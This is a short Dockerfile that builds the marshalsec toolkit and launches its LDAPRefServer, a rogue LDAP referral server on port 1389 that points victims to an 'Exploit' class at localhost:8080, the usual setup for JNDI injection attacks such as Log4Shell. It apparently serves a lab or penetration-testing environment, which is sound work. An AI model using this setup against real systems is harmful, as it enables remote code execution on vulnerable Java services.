# Use an openjdk image as base
FROM openjdk:8-jdk-alpine

# Install necessary packages
RUN apk --no-cache add maven git

# Clone marshalsec repository
RUN git clone https://github.com/mbechler/marshalsec.git /opt/marshalsec

WORKDIR /opt/marshalsec
# Build marshalsec
RUN mvn clean package -DskipTests

# Expose LDAP port
EXPOSE 1389

# Command to run LDAP server
CMD ["java", "-cp", "target/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", "http://localhost:8080/#Exploit"]